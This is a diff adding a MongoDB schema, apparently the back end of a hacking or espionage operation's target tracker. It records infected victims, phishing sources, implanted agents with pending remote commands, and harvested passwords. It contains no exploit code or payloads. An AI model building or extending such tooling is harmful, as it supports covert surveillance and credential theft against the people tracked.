@@ -1,0 +1,343 @@
+Targets.mongo
+
+
+db.createCollection( "targets" , { 
+   validator: { $jsonSchema: { 
+      bsonType: "object",      
+      required: [ "t_id" ], 
+      properties: {
+         _id : {
+              bsonType: "objectId" }, 
+         t_id: { 
+            bsonType: "string",
+            description: "Machine mobile email other" },
+         source: { 
+            enum: [ "1", "2", "3", "4", "5", "6", "7"],
+            description: "1 phis 2 Agent 3 RIM 4 RIMMob 5 Mobile 6 Recce 7 Other" },
+         t_type: { 
+            enum: [ "1", "2", "3", "4" ],
+            description: "1 email 2 Agent 3 mobile 4 Others" },          
+         alias: { 
+            bsonType: "string", 
+            description: "Alias name of target used in subject" },
+         name: { 
+            bsonType: "string", 
+            description: "Name of target" },   
+         i_dtg: { 
+            bsonType: "date", 
+            description: "When infected" },
+         i_ip: { 
+            bsonType: "string", 
+            description: "IP address infection" },
+         c_dtg: { 
+            bsonType: "date", 
+            description: "last contact time" },
+         c_ip: {
+            bsonType: "string",
+            description: "last contact ip" }, 
+         r_ip: {
+            bsonType: "string",
+            description: "Remote server ip from where Agent download" },      
+         status: { 
+            enum: [ "0", "1", "2", "3" ],
+            description: "0 Deactive 1 Online-avilable 2 tmpOnline-tmpdisable 3 Reject" },
+         p_status: { 
+            enum: [ "0", "1" ],
+            description: "password status 0 Change 1 Available" },
+         pass: { 
+            bsonType: "array",
+            description: "all passwords available" },            
+         upl_c_dtg: {
+            bsonType: "date", 
+            description: "when uploader contact for mobile an agent only" }, 
+         u_status: { 
+            enum: [ "0", "1", "2", "3" ],
+            description: "uploader 0 Deactive 1 Online-avilable 2 tmpOnline-tmpdisable 3 Reject" },    
+         cmds: {
+            bsonType: "array", 
+            description: "commands passed to agents with date-cmd" }, 
+         c_cmd: {
+            bsonType: "string",
+            description: "Current Cmd pending for remote execution" },
+         org: {
+            bsonType: "int",
+            description: "Organisation of tgt" }, 
+         dep: {
+            bsonType: "int",
+            description: "Department of tgt" },
+         mailserver: {
+            bsonType: "int",
+            description: "Mail Server for mail tgt only" },
+         country: {
+            bsonType: "int",
+            description: "Belongs to country" },
+         t_location: {
+            bsonType: "int",
+            description: "Machine Target location" },      
+         priority: { 
+            enum: [ "1", "2", "3", "4", "5" ],
+            description: "priority" },
+         level: { 
+            enum: [ "1", "2", "3", "4", "5" ],
+            description: "1-oprational, 2-aAdmin 3-User/Dte 4-finally seen by user" },   
+         add_by: {
+            bsonType: "int",
+            description: "Target add by" },
+         add_dtg: { 
+            bsonType: "date", 
+            description: "target add time" },   
+         up_p_by: {
+            bsonType: "int",
+            description: "Target Password Update by" },
+         up_p_dtg: { 
+            bsonType: "date", 
+            description: "update password status time only for mail" },
+         up_s_by: {
+            bsonType: "int",
+            description: "Target Status Update by" },          
+         up_s_dtg: { 
+            bsonType: "date", 
+            description: "update status time only for mobile or agent" },               
+         as_usr: {
+            bsonType: "int",
+            description: "Assigned user name" },
+         as_dte: {
+            bsonType: "int",
+            description: "Assigned dte" }, 
+         as_s_dte: {
+            bsonType: "int",
+            description: "Assigned sub dte" },            
+         hs_details:{
+            bsonType: "array", 
+            description: "target hardware and sofrware details" },                                      
+         contact: {
+               bsonType: "object",               
+               properties: {
+                  email: {
+                     bsonType: "array",
+                     description: "All Emails" },
+                  mobile: {
+                     bsonType: "array",
+                     "description": "All Mobiles" }, 
+                  s_media: {
+                     bsonType: "array",
+                     "description": "all Social Media" },
+                  others: {
+                     bsonType: "string",
+                     "description": "Other Details" }      
+               }
+            },                                        
+         lst_msg: { 
+            bsonType: "int", 
+            description: "Last Message Sent in number" },
+         lst_msg_by: {
+            bsonType: "int",
+            description: "Last msg upload by" },
+         lst_msg_dtg: { 
+            bsonType: "date", 
+            description: "Last msg upload on" },       
+         ip_history: {
+            bsonType: "array",
+            description: "All Ips Contact Details" } 
+      }
+   }
+}});
+   
+          
+db.targets.insert({
+  t_id: "ABCD",
+  alias: "ALIAS",
+  source: "1",
+  name: "name",
+  i_dtg: new Date(),
+  i_ip: "192.168.10.254",
+  c_dtg: new Date(),
+  l_data_dw: new Date(),
+  c_ip: "192.168.5.101",
+  r_ip:"192.168.5.101",  
+  status: "1",
+  p_status: "0",
+  contact: {'email' : ["abc.com"], 'mobile' : ['12345'], 's_media' : ['facebok'], 'others' : "other"}, 
+  lst_msg: NumberInt(1),
+  ip_history: []
+})
+
+/***********************/
+*     New Format        *
+/***********************/
+
+db.createCollection( "targets" , { 
+   validator: { $jsonSchema: { 
+      bsonType: "object", 
+      properties: {
+         _id : {
+              bsonType: "objectId" }, 
+         t_id: { 
+            bsonType: "string",
+            description: "Email or Mobile" },
+         priority: { 
+            enum: [ "1", "2", "3", "4", "5" ],
+            description: "priority" },   
+         source: { 
+            enum: [ "1", "2", "3", "4", "5", "6"],
+            description: "1 phis 2 Agent 3 RIM 4 Recce 5 Ateam, 6 Other" },          
+         t_type: { 
+            enum: [ "1", "2", "3"],
+            description: "1 Email 2 Mobile 3 Others" },          
+         alias: { 
+            bsonType: "string", 
+            description: "Alias name of target used in subject" },
+         name: { 
+            bsonType: "string", 
+            description: "Name of target" }, 
+         agents: {
+               bsonType: "array",               
+               properties: {
+                agent_id: {
+                     bsonType: "string",
+                     description: "All Agents for Mobile and Machine" },
+                type: { 
+                  enum: [ "1", "2" ],
+                  description: "1 Machine 2 Mobile" },
+               source: { 
+                  enum: [ "1", "2" ],
+                  description: "1 Inhouse 2 RIMS" },
+               add_by: {
+                  bsonType: "string",
+                  description: "Agent add by" },
+               add_dtg: { 
+                  bsonType: "date", 
+                  description: "Agent add time" },      
+               i_dtg: { 
+                  bsonType: "date", 
+                  description: "When infected" },
+               i_ip: { 
+                  bsonType: "string", 
+                  description: "IP address infection" },
+               c_dtg: { 
+                  bsonType: "date", 
+                  description: "last contact time" },
+               c_ip: {
+                  bsonType: "string",
+                  description: "last contact ip" }, 
+               r_ip: {
+                  bsonType: "string",
+                  description: "Remote server ip/Domain from where Agent download" },
+               status: { 
+                  enum: [ "1", "2", "3", "4" ],
+                  description: "1 Online-avilable 2 tmpOnline-tmpdisable 3 Dead 4 Reject" },   
+               upl_c_dtg: {
+                  bsonType: "date", 
+                  description: "when uploader contact for mobile an agent only" }, 
+               upl_status: { 
+                  enum: [ "1", "2", "3" ],
+                  description: "uploader 1 Online-avilable 2 tmpOnline-tmpdisable 3 Dead" },    
+               cmds: {
+                  bsonType: "array", 
+                  description: "commands passed to agents with date-cmd" }, 
+               c_cmd: {
+                  bsonType: "string",
+                  description: "Current Cmd pending for remote execution" }  
+               }
+            },
+         passwords: {
+               bsonType: "array",               
+               properties: {
+                 pass: { 
+                bsonType: "string", 
+                description: "password" },
+                 status: { 
+                enum: [ "1", "2" ],
+                description: "1 Active 2 Not Active" },
+             source: { 
+                enum: [ "1", "2" ],
+                description: "1 Inhouse 2 RIMS" },
+             user: { 
+                bsonType: "int", 
+                description: "Whos effort is this Agent" },     
+             dtg: { 
+                bsonType: "date", 
+                description: "When recv" }
+               }
+         },         
+         mailserver: {
+            bsonType: "int",
+            description: "Mail Server for mail tgt only" }, 
+         org: {
+            bsonType: "int",
+            description: "Organisation of tgt" }, 
+         dep: {
+            bsonType: "int",
+            description: "Department of tgt" },        
+         country: {
+            bsonType: "int",
+            description: "Belongs to country" },
+         t_loc: {
+            bsonType: "int",
+            description: "Machine Target location" },    
+         add_by: {
+            bsonType: "int",
+            description: "Target add by" },
+         add_dtg: { 
+            bsonType: "date", 
+            description: "target add time" }, 
+         status: { 
+            enum: [ "1", "2", "3", "4" ],
+            description: "1 Active 2 Deactive 3 Hybernate 4 Discard" },  
+         up_s_by: {
+            bsonType: "int",
+            description: "Target Status Update by" },          
+         up_s_dtg: { 
+            bsonType: "date", 
+            description: "update status time only for mobile or agent" },               
+         as_usr: {
+            bsonType: "int",
+            description: "Assigned user name" },
+         as_dte: {
+            bsonType: "int",
+            description: "Assigned dte" }, 
+         as_s_dte: {
+            bsonType: "int",
+            description: "Assigned sub dte" },            
+         hs_details:{
+            bsonType: "array", 
+            description: "target hardware and sofrware details" },                                      
+         contact: {
+               bsonType: "array",               
+               properties: {
+                  email: {
+                     bsonType: "array",
+                     description: "All Emails" },
+                  mobile: {
+                     bsonType: "array",
+                     "description": "All Mobiles" }, 
+                  s_media: {
+                     bsonType: "array",
+                     "description": "all Social Media" },
+                  others: {
+                     bsonType: "string",
+                     "description": "Other Details" }      
+               }
+            },                                        
+         lst_msg: { 
+            bsonType: "int", 
+            description: "Last Message Sent in number" },
+         lst_msg_by: {
+            bsonType: "int",
+            description: "Last msg upload by" },
+         lst_msg_dtg: { 
+            bsonType: "date", 
+            description: "Last msg upload on" },
+         lst_view_by: {
+            bsonType: "int",
+            description: "Last view by for emails" },
+         lst_view_dtg: { 
+            bsonType: "date", 
+            description: "Last view for emails" },            
+         ip_history: {
+            bsonType: "array",
+            description: "All Ips Contact Details" } 
+      }
+   }
+}});
+
